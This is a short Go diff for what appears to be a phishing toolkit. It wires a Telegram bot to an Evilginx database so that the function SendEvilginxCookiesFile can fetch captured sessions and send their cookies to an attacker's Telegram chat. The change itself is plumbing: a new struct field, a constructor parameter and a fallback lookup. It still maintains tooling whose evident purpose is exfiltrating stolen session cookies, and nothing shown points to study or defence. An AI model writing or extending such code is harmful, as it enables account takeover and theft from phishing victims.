@@ -23,14 +23,15 @@ import (
 )
 
 type TelegramBot struct {
-	Token     string
-	ChatID    string
-	Enabled   bool
-	Client    *http.Client
+	Token       string
+	ChatID      string
+	Enabled     bool
+	Client      *http.Client
+	EvilginxDB  *database.Database
 }
 
 // NewTelegramBot ينشئ كائن جديد من بوت تليجرام
-func NewTelegramBot(token string, chatID string) *TelegramBot {
+func NewTelegramBot(token string, chatID string, evilginxDB *database.Database) *TelegramBot {
 	enabled := token != "" && chatID != ""
 	if enabled {
 		tokenPreview := ""
@@ -43,10 +44,11 @@ func NewTelegramBot(token string, chatID string) *TelegramBot {
 	}
 	
 	return &TelegramBot{
-		Token:    token,
-		ChatID:   chatID,
-		Enabled:  enabled,
-		Client:   &http.Client{},
+		Token:       token,
+		ChatID:      chatID,
+		Enabled:     enabled,
+		Client:      &http.Client{},
+		EvilginxDB:  evilginxDB,
 	}
 }
 
@@ -907,8 +909,14 @@ func (t *TelegramBot) SendEvilginxCookiesFile(sessionID string, evilginxDB *data
 		return fmt.Errorf("telegram bot is disabled")
 	}
 	
+	// Use the database reference from the struct
+	db := t.EvilginxDB
+	if db == nil {
+		db = evilginxDB // fallback to parameter
+	}
+	
 	// Get session from Evilginx database
-	session, err := evilginxDB.GetSessionBySid(sessionID)
+	session, err := db.GetSessionBySid(sessionID)
 	if err != nil {
 		return fmt.Errorf("failed to get session: %v", err)
 	}
